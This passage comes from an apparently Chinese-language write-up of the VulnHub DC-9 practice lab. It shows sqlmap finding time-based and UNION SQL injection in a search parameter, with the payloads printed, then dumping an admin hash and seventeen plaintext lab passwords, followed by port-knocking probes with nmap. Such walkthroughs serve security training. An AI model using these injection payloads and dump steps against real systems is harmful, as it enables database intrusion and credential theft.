or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 02:55:09 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:55:09] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing if POST parameter &#x27;search&#x27; is dynamic</span></span><br><span class="line"><span class="string">[02:55:10] [WARNING] POST parameter &#x27;search&#x27; does not appear to be dynamic</span></span><br><span class="line"><span class="string">[02:55:10] [WARNING] heuristic (basic) test shows that POST parameter &#x27;search&#x27; might not be injectable</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing for SQL injection on POST parameter &#x27;search&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Generic inline queries&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] POST parameter &#x27;search&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable </span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] target URL appears to be UNION injectable with 6 columns</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] POST parameter &#x27;search&#x27; is &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable</span></span><br><span class="line"><span class="string">POST parameter &#x27;search&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] fetching database names</span></span><br><span class="line"><span class="string">available databases [3]:</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string">[*] Staff</span></span><br><span class="line"><span class="string">[*] users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:55:31] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 02:55:31 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure>

<h3 id="4-æ‰«æå½“å‰æ•°æ®åº“ï¼Œç»“æœä¸ºStaff"><a href="#4-æ‰«æå½“å‰æ•°æ®åº“ï¼Œç»“æœä¸ºStaff" class="headerlink" title="4.æ‰«æå½“å‰æ•°æ®åº“ï¼Œç»“æœä¸ºStaff"></a>4.æ‰«æå½“å‰æ•°æ®åº“ï¼Œç»“æœä¸ºStaff</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt --dbs --batch --current-db</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 02:57:16 /2020-09-02/</span><br><span class="line"></span><br><span class="line">[02:57:16] [INFO] parsing HTTP request from <span class="string">&#x27;demo.txt&#x27;</span></span><br><span class="line">[02:57:16] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[02:57:16] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: search (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: search=1<span class="string">&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;</span>xHdu<span class="string">&#x27;=&#x27;</span>xHdu</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 6 columns</span><br><span class="line">    Payload: search=1<span class="string">&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[02:57:16] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[02:57:16] [INFO] fetching current database</span></span><br><span class="line"><span class="string">current database: &#x27;</span>Staff<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[02:57:17] [INFO] fetching database names</span></span><br><span class="line"><span class="string">available databases [3]:</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string">[*] Staff</span></span><br><span class="line"><span class="string">[*] users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:57:17] [INFO] fetched data logged to text files under &#x27;</span>/root/.<span class="built_in">local</span>/share/sqlmap/output/192.168.1.8<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 02:57:17 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure>

<h3 id="5-çˆ†è¡¨ï¼ŒUsers"><a href="#5-çˆ†è¡¨ï¼ŒUsers" class="headerlink" title="5.çˆ†è¡¨ï¼ŒUsers"></a>5.çˆ†è¡¨ï¼ŒUsers</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D Staff --tables --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 02:59:07 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:59:07] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[02:59:07] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[02:59:07] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[02:59:07] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[02:59:07] [INFO] fetching tables for database: &#x27;Staff&#x27;</span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">[2 tables]</span></span><br><span class="line"><span class="string">+--------------+</span></span><br><span class="line"><span class="string">| StaffDetails |</span></span><br><span class="line"><span class="string">| Users        |</span></span><br><span class="line"><span class="string">+--------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:59:07] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 02:59:07 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure>

<h3 id="6-çˆ†å­—æ®µ"><a href="#6-çˆ†å­—æ®µ" class="headerlink" title="6.çˆ†å­—æ®µ"></a>6.çˆ†å­—æ®µ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D Staff -T Users --column --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:02:44 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:02:44] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[03:02:44] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:02:44] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:02:44] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[03:02:44] [INFO] fetching columns for table &#x27;Users&#x27; in database &#x27;Staff&#x27;</span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">Table: Users</span></span><br><span class="line"><span class="string">[3 columns]</span></span><br><span class="line"><span class="string">+----------+-----------------+</span></span><br><span class="line"><span class="string">| Column   | Type            |</span></span><br><span class="line"><span class="string">+----------+-----------------+</span></span><br><span class="line"><span class="string">| Password | varchar(255)    |</span></span><br><span class="line"><span class="string">| UserID   | int(6) unsigned |</span></span><br><span class="line"><span class="string">| Username | varchar(255)    |</span></span><br><span class="line"><span class="string">+----------+-----------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:02:44] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:02:44 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure>

<h3 id="7-çˆ†æ•°æ®"><a href="#7-çˆ†æ•°æ®" class="headerlink" title="7.çˆ†æ•°æ®"></a>7.çˆ†æ•°æ®</h3><p><code>å¾—åˆ°adminä¸hashå€¼</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D Staff -T Users -C Username,Password --dump --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:04:03 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:04:03] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:04:03] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] fetching entries of column(s) &#x27;Password, Username&#x27; for table &#x27;Users&#x27; in database &#x27;Staff&#x27;</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] recognized possible password hashes in column &#x27;Password&#x27;</span></span><br><span class="line"><span class="string">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N</span></span><br><span class="line"><span class="string">do you want to crack them via a dictionary-based attack? [Y/n/q] Y</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] using hash method &#x27;md5_generic_passwd&#x27;</span></span><br><span class="line"><span class="string">what dictionary do you want to use?</span></span><br><span class="line"><span class="string">[1] default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)</span></span><br><span class="line"><span class="string">[2] custom dictionary file</span></span><br><span class="line"><span class="string">[3] file with list of dictionary files</span></span><br><span class="line"><span class="string">&gt; 1</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] using default dictionary</span></span><br><span class="line"><span class="string">do you want to use common password suffixes? (slow!) [y/N] N</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] starting 4 processes </span></span><br><span class="line"><span class="string">[03:04:15] [WARNING] no clear password(s) found                                                                                                  </span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">Table: Users</span></span><br><span class="line"><span class="string">[1 entry]</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string">| Username | Password                         |</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string">| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:04:15] [INFO] table &#x27;Staff.Users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.1.8/dump/Staff/Users.csv&#x27;</span></span><br><span class="line"><span class="string">[03:04:15] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:04:15 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure>

<h3 id="8-å…¶ä»–ç”¨æˆ·ä¿¡æ¯"><a href="#8-å…¶ä»–ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="8.å…¶ä»–ç”¨æˆ·ä¿¡æ¯"></a>8.å…¶ä»–ç”¨æˆ·ä¿¡æ¯</h3><p><code>ä¹‹å‰webç•Œé¢å‘ç°æœ‰ç”¨æˆ·ä¿¡æ¯ï¼Œä¹‹ååˆçˆ†å‡ºusersæ•°æ®åº“ï¼Œæ‰€ä»¥æ¨æµ‹useræ•°æ®åº“å­˜æ”¾çš„æ˜¯ç”¨æˆ·ä¿¡æ¯</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D users -T UserDetails -C username,password --dump --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:12:26 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:12:26] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:12:26] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] fetching entries of column(s) &#x27;password, username&#x27; for table &#x27;UserDetails&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">Table: UserDetails</span></span><br><span class="line"><span class="string">[17 entries]</span></span><br><span class="line"><span class="string">+-----------+---------------+</span></span><br><span class="line"><span class="string">| username  | password      |</span></span><br><span class="line"><span class="string">+-----------+---------------+</span></span><br><span class="line"><span class="string">| marym     | 3kfs86sfd     |</span></span><br><span class="line"><span class="string">| julied    | 468sfdfsd2    |</span></span><br><span class="line"><span class="string">| fredf     | 4sfd87sfd1    |</span></span><br><span class="line"><span class="string">| barneyr   | RocksOff      |</span></span><br><span class="line"><span class="string">| tomc      | TC&amp;TheBoyz    |</span></span><br><span class="line"><span class="string">| jerrym    | B8m#48sd      |</span></span><br><span class="line"><span class="string">| wilmaf    | Pebbles       |</span></span><br><span class="line"><span class="string">| bettyr    | BamBam01      |</span></span><br><span class="line"><span class="string">| chandlerb | UrAG0D!       |</span></span><br><span class="line"><span class="string">| joeyt     | Passw0rd      |</span></span><br><span class="line"><span class="string">| rachelg   | yN72#dsd      |</span></span><br><span class="line"><span class="string">| rossg     | ILoveRachel   |</span></span><br><span class="line"><span class="string">| monicag   | 3248dsds7s    |</span></span><br><span class="line"><span class="string">| phoebeb   | smellycats    |</span></span><br><span class="line"><span class="string">| scoots    | YR3BVxxxw87   |</span></span><br><span class="line"><span class="string">| janitor   | Ilovepeepee   |</span></span><br><span class="line"><span class="string">| janitor2  | Hawaii-Five-0 |</span></span><br><span class="line"><span class="string">+-----------+---------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:12:26] [INFO] table &#x27;users.UserDetails&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.1.8/dump/users/UserDetails.csv&#x27;</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:12:26 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x05-çˆ†ç ´"><a href="#0x05-çˆ†ç ´" class="headerlink" title="0x05.çˆ†ç ´"></a>0x05.çˆ†ç ´</h2><h3 id="1-ç ´è§£adminå¯†ç ä¸ºtransorbital1"><a href="#1-ç ´è§£adminå¯†ç ä¸ºtransorbital1" class="headerlink" title="1.ç ´è§£adminå¯†ç ä¸ºtransorbital1"></a>1.ç ´è§£adminå¯†ç ä¸º<code>transorbital1</code></h3><img src="/2020/09/02/DC-9/image-20200902151603443.png" class>

<h2 id="0x06-ç™»å…¥web-application"><a href="#0x06-ç™»å…¥web-application" class="headerlink" title="0x06.ç™»å…¥web application"></a>0x06.ç™»å…¥web application</h2><p><code>å‘ç°æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ¨æµ‹å­˜åœ¨åŒ…å«</code></p>
<img src="/2020/09/02/DC-9/image-20200902154421208.png" class>

<p><code>æµ‹è¯•ï¼Œçˆ†ç ´åŒ…å«å‚æ•°ç•¥</code></p>
<img src="/2020/09/02/DC-9/image-20200902154513168.png" class>

<p><code>å¯ä»¥çœ‹åˆ°æ•°æ®åº“è·‘å‡ºæ¥çš„ç”¨æˆ·å¯ä»¥è¿›è¡Œç™»å…¥</code></p>
<p><code>ä½†æ˜¯æœ‰knockdå­˜åœ¨è¿‡æ»¤ï¼Œæ‰€ä»¥æŸ¥çœ‹knockdé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°ä¸‰ä¸ªç”¨æˆ·å¯ä»¥ç™»å…¥</code></p>
<img src="/2020/09/02/DC-9/image-20200902154938542.png" class>

<p><code>nmapæµ‹è¯•</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 192.168.1.8; done</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 03:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00066s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">7469/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.20 seconds</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 03:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">8475/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 